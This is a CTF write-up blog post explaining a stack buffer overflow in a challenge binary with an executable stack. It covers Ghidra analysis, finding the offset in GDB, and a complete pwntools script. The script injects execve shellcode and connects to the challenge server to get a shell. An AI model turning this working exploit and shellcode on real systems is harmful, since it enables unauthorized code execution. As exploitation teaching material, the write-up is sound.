---
layout: post
current: post
cover: False # Use URL here if you want to add any image as cover
navigation: True
title: Backdoor-Weekly-Challenge writeup - Code me If You Can
date: 2020-04-23 12:23:00
tags: ['writeups','weekly-challenges']
class: post-template
subclass: 'post tag'
author: 'Th3F0x'
---


# code-me-if-you-can : Writeup

## Challenge Description:
The challenge description says:
>What is W ^ X policy? Meh, i don't care

If you google about `W^X policy` you come up against this wikipedia article [W^X Wikipeda](https://en.wikipedia.org/wiki/W%5EX). This says
>W^X ("write xor execute", pronounced W xor X) is a security feature in operating systems and virtual machines. It is a memory protection policy whereby every page in a process's or kernel's address space may be either writable or executable, but not both. Without such protection, a program can write (as data "W") CPU instructions in an area of memory intended for data and then run (as executable "X"; or read-execute "RX") those instructions.

If you are confused about some of those terms , feel free to google them around, but, in short this means that W^X policy enforces that memory be either writable to or executable from but not both. It is a modern security policy which is enforced by almost all modern compilers.This means that one can't inject some malicious bytes info memory and later , due to some vulnerablity be able to execute those bytes as instructions.

## Challenge Preliminary Analysis:
Whenever i usually get a file in a ctf challenge the first step i like to do is to run file on it. Running the `file` command on the file gives us the following output:
```
➜  file chall 
chall: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=77c74252d073a52cd3bc0165848fbf185f546cea, not stripped
```
So it says that it is a `32-bit` `ELF` file for `Intel 80386` on `Linux`. `ELF` is like the linux version of the exe files on windows i.e. they are linux executables. The `32-bit` basically means that the file uses the 32-bit instruction set for the Intel 80386 processor or what is familiarly known as the `x86` assembly instructions. Other important parts i take from this are that this is `not stripped` i.e. we have the names of the functions and other global varibles left in the binary, which makes it easier to debug.
Another important tool which is very useful for preliminary analysis is [checksec](https://github.com/RobinDavid/checksec/blob/master/checksec.sh) . This is also a part of the [pwntools](http://docs.pwntools.com/en/stable/) package. The latter one is the one I use. This gives information about the basic protection mechanisms for the binary.
If we run checksec on the binary , we get:
```
➜  checksec chall 
[*] '/<REDACTED>/chall'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
Here I redact the actual location of the binary on my computer(Shown with \<REDACTED\>).
Again, if we look at this info, first we have the architecture(type of machine this is supposed to work on)
Important things to notice here are the `Stack: No canary` , `NX disabled`, `PIE enabled` and `Has RWX segments` options.
> The `no canary` means that if we were to somehow cause a buffer overflow , there would be no random stack value present for validation of the stack frame. In short, buffer overflows with instruction pointer control are possible.

>The `PIE enabled` option stands for Position independent execution, which for us means that each time the binary is run it will be loaded at a different address in memory i.e. we can't know addresses in the binary beforehand.

> The `NX disabled` and `Has RWX segments` are related to the `W^X policy` mentioned in the challenge desciption. This means that this protection has been disabled for the stack(`NX => non executable stack`) , thus also implying the presence of `RWX` segments(RWX => Read, Write, Execute permissions)

Hence if we were to somehow control the intruction pointer to some area on the stack which we write to, then we could execute arbitrary code that `WE` give to the process.

Apart from this, we can run the binary to sort of figure out based on how it behaves, what it might be doing. If we run the binary, we get:
```
What's this:0xffcb3188?
```
After printing this message, the process waits for our input. Suppose we enter AAAA or something:
```
What's this:0xffcb3188?
AAAA
Hello, World!
```
So it prints a hello world message. We can first observe that we we given some sort of number in hexadecimal, then prompted for input, after receiving which, the program prints hello, world and exits. We can easily check for a buffer overflow in the input field by using a large number of "A"s

```
➜  python -c 'print "A"*100' | ./chall 
What's this:0xffdadfa8?
[1]    7544 done                              python -c 'print "A"*100' | 
       7545 segmentation fault (core dumped)  ./chall
```
Thus giving 100 "A"s causes a segmentation fault, may lead to a buffer overflow. SInce the program does not display something like our input, i am not going to be testing for format strings initially.


## Static Analysis:
For static analysis , i recommend using a disassembler(or decompiler if possible) to analyse the instructions being executed by the binary. One really nice, free and open-source alternative is [Ghidra](https://ghidra-sre.org/). It is an open source disassembler-decompiler tool released by the NSA. To begin the analysis , we can simply import the binary in ghidra, and view both the disassembly and decompilation side-by-side.
The decompilation for the main function is as follows:

```C
undefined4 main(void)
{
  ignore_me_setup(&stack0x00000004);
  vulnerable_function();
  write(1,"Hello, World!\n",0xe);
  return 0;
}
```
We see that it calls an ignore_me functions. If you view it's disassembly, it does some setvbuf kind of thing which is just used for I/O buffering and does not look very interesting.

There is a call to a `vulnerable_function` here followed by a write . Write , here, is simply writing the hello world string to our terminal. Based on our experience of running the binary, this must be the function which takes our input. So let's check it out in ghidra:

```C
void vulnerable_function(void)
{
  undefined local_64 [92];
  
  printf("What\'s this:%p?\n",local_64);
  read(0,local_64,0x100);
  return;
}
```
We see our What's this string here. It seems to print something as a pointer. What it is doing is essentially printing the address of the local_64 variable. After this, it calls read with some arguements, one of them being this buffer. If you look at the man page of read(man 2 read):
>ssize_t read(int fd, void *buf, size_t count);

>read()  attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.

It is used to read input from what are called `file descriptors`. I won't be going into detail on this, but , 0 refers to the file descriptor for the standard input, hence here it is trying to read upto 0x100 bytes from our input. An interesting thing to notice here is that ghidra was able to determine the size of the buffer to be 92 bytes, but read here can take upto 0x100 i.e. 256 bytes of input. i.e. we have a stack buffer overflow (like we suspected during our preliminary analysis). We can modify the return address on the stack to gain code execution.

## Initial Strategy:

Since `PIE` is enabled, we can't jump to any address from the binary (since the address is not known , and we have no way to leak it right now). We however do have a stack leak along with an executable stack. Hence we can jump to the bytes we write into memory and execute them. If we input some machine code which can execute a shell for us (aptly called `shellcode`) we can pop a shell.

## Exploitation + Dynamic Analysis:
For dynamic analysis I am going to be using GDB with the [gef](https://gef.readthedocs.io/) extention to make it look much better. For exploitation I am going to use the [pwntools](http://docs.pwntools.com/en/stable/) framework, which is one of the most loved and powerful ctf frameworks around.
We first need the offset in our input , which corresponds to the return address. I here present two methods (ofcourse there are other ways as well): one which is applicable here and a general-purpose method:

1. Using Ghidra(applicable here): you can see that the decompilation says that the size of the buffer is 92 bytes, there is no other local variable. Hence the offset to the return address is 92 + 4 = 96 bytes (buffer + saved base pointer)

2. Using a cyclic pattern : you can create a pattern as the input, run it in a debugger(like gdb) and view the value which crashes the program, after which you can identify it's offset in the pattern.

For the 2nd case , you can use the cyclic utility from pwntools. Run `cyclic 256` on your shell to create a pattern of 256 bytes:
```
➜  cyclic 256 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac
```
Copy this and start this program in gdb. Run it and send this as input:

```
➜  gdb chall
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[+] Configuration from '/<REDACTED>/.gef.rc' restored
Reading symbols from chall...(no debugging symbols found)...done.
gef➤  r
Starting program: /<REDACTED>/chall 
What's this:0xffffccf8?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x100     
$ebx   : 0x61616178 ("xaaa"?)
$ecx   : 0xffffccf8  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x100     
$esp   : 0xffffcd60  →  "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]"
$ebp   : 0x61616179 ("yaaa"?)
$esi   : 0xf7fa2000  →  0x001d7d6c
$edi   : 0x0       
$eip   : 0x6261617a ("zaab"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd60│+0x0000: "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]"	 ← $esp
0xffffcd64│+0x0004: "caabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboa[...]"
0xffffcd68│+0x0008: "daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpa[...]"
0xffffcd6c│+0x000c: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
0xffffcd70│+0x0010: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffcd74│+0x0014: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffcd78│+0x0018: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffcd7c│+0x001c: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6261617a
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x6261617a in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x6261617a in ?? ()
gef➤  
gef➤  
```
You can see that our program crashed due to a segmentation fault, which means that it tried to access invalid memory . This happened because we overwrote the stack pointer with some garbage which didn't point to any valid memory. We can see this value with `x/wx $eip`.
```
gef➤  x/wx $eip
0x6261617a:	Cannot access memory at address 0x6261617a
```
This `0x6261617a` is the value whose offset we need from our pattern. We can again us the cyclic utility for this:
```
➜  cyclic -l 0x6261617a          
100
```
Thus the offset actually is `100`. This is not 96 as we predicted because there is also a `push ebx` instruction in the disassemby of the function, which makes the space for the extra 4 bytes. Hence, one should take note that dynamic analysis is very important for exploitation.
Now we are ready , we can fill the buffer with shellcode, overwrite enough to reach the return address and overwrite it with the address we receive. However, we can't use a normal techinique like piping for payloads, since this address of the buffer changes on every execution. We need a way to interact with the binary dynamically. This is where pwntools really starts to seal the deal. It can do all that and so much more.

A simple script to just run the program normally and interact with it through the terminal would be:
```py
from pwn import *

p = process('./chall')

p.interactive()
```
We create a simple process object and interact with it(intuitive isn't it).On running this:
```
➜  python solve.py   
[+] Starting local process './chall': pid 10416
[*] Switching to interactive mode
What's this:0xffd252b8?
$ asdf
Hello, World!
[*] Process './chall' stopped with exit code 0 (pid 10416)
[*] Got EOF while reading in interactive
```
The $ sign is next to anywhere we enter input. We can use the `p.recv()` to receive input into a python varible:
```py
from pwn import *

p = process('./chall')
line = p.recv()
print "Got : ",line

p.interactive()
```
Run this:
```
➜  python solve.py
[+] Starting local process './chall': pid 10747
Got :  What's this:0xffcad1d8?

[*] Switching to interactive mode
$  
```
Thus we can process the address using the python splicing :
```py
from pwn import *

p = process('./chall')
line = p.recv()
addr = line[len("What's this:"):-2] # after colon, except last two character i.e. ?, '\n' or newline
print "addr:",addr

p.interactive()
```
Run that:
```
➜  python solve.py
[+] Starting local process './chall': pid 11019
addr: 0xffa41818
[*] Switching to interactive mode
$  
```
Now that we have the required address, we can make our final exploit. We need some shellcode, we can craft some ourselves (refer to the link in the end), but for now i am using some shellcode from the internet. [Shellstorm](http://shell-storm.org/shellcode/), we use the [Linux x86 execve('/bin/bash) shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php), as it corresponds to the required architecture. Thus our payload looks like:
> payload = shellcode + "A"*(100-length_of+shellcode) + addr

We can use `p.send()` or `p.sendline()` to feed it to the program:
```py
from pwn import *

p = process('./chall')
line = p.recv()
# the address of the buffer
addr = line[len("What's this:"):-2] # after colon, except last two characters i.e. ?, '\n' or newline
print "addr:", addr
# the shellcode
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# our payload
payload = shellcode + "A"*(100-len(shellcode)) + addr
# send it!
p.send(payload)

p.interactive()
```
Run it:
```
➜  python solve.py
[+] Starting local process './chall': pid 11706
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 11706)
```
We didn't get a shell. The process did however end with a segmentation fault. We must investigate this. You can use `gdb.attach(p)` inside pwntools and it will attach gdb to that process.
```py
from pwn import *

p = process('./chall')
gdb.attach(p)
line = p.recv()
# the address of the buffer
addr = line[len("What's this:"):-2] # after colon, except last two characters i.e. ?, '\n' or newline
print "addr:", addr
# the shellcode
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# our payload
payload = shellcode + "A"*(100-len(shellcode)) + addr
# send it!
p.send(payload)

p.interactive()
```
When you run it, a debugger window pops up, you enter `c` to continue the execution.
```
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
                                                    .
                                                    .
                                                    .
                                                    .
                                                    .

0x66667830 in ?? ()
gef➤ p $eip
0x66667830
gef➤
```
You can see that eip did change but it still looks like trash. With experience you can realise that those are ascii values. If you print it using python:
```
>>> "66667830".decode('hex')
'ffx0'
```
If you view the terminal output for the addr variable, you can understand that it is the bytes from the addr variable. What happened here was that we used the string hex representation as the address, we instead would have to use the raw bytes corresponding to that 32bit value. For this we would first have to convert the value to integer, and then convert or pack it into a string. For packing pwntools has a nice utility called `p32(num)` which converts a number to it's corresponding 32bit bytes representation. We use int(hex_string,16) to convert the hexstring to an integer number.

Modified script:

```py
from pwn import *

p = process('./chall')
gdb.attach(p)
line = p.recv()
# the address of the buffer
addr = int(line[len("What's this:"):-2],16) # after colon, except last two characters i.e. ?, '\n' or newline
# the shellcode
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# our payload
payload = shellcode + "A"*(100-len(shellcode)) + p32(addr)
# send it!
p.send(payload)

p.interactive()
```
Run this:
```
➜  python solve.py
[+] Starting local process './chall': pid 12719
[*] running in new terminal: /usr/bin/gdb -q  "./chall" 12719 -x "/tmp/pwnqxBTc2.gdb"
[+] Waiting for debugger: Done
[*] Switching to interactive mode
$ whoami
thefox
$ 
```
and in gdb:
```
gef➤  c
Continuing.
process 12719 is executing new program: /bin/dash
```
Thus,we have successfully done a shellcode injection challenge. Pat yourself on the back :)
To turn this to a simple server exploit, just comment out the gdb.attach , process statements, and add a new remote object statement. Everything else stays the same. This is so easy.
```py
➜  cat solve.py
from pwn import *

# p = process('./chall')
# gdb.attach(p)
p = remote("163.172.144.42", 10180)
line = p.recv()
# the address of the buffer
addr = int(line[len("What's this:"):-2],16) # after colon, except last two characters i.e. ?, '\n' or newline
# the shellcode
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# our payload
payload = shellcode + "A"*(100-len(shellcode)) + p32(addr)
# send it!
p.send(payload)

p.interactive()
```
Run this:
```
➜  python solve.py
[+] Opening connection to 163.172.144.42 on port 10180: Done
[*] Switching to interactive mode
$ ls
Dockerfile
beast.toml
chall
flag.txt
static
$  
```
That is the solution to this challenge. Pretty fun, right?

## Links for Reading and Reference:
1.  [Shellcode Injection by Dhaval Kapil](https://dhavalkapil.com/blogs/Shellcode-Injection/)
2.  [Shellcode Buffer Overflow by LiveOverflow](https://www.youtube.com/watch?v=HSlhY4Uy8SA&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=16&t=0s) (although i recommend the [entire playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) for anyone interested)
3.  [Pwntools Documentation](http://docs.pwntools.com/en/stable/)
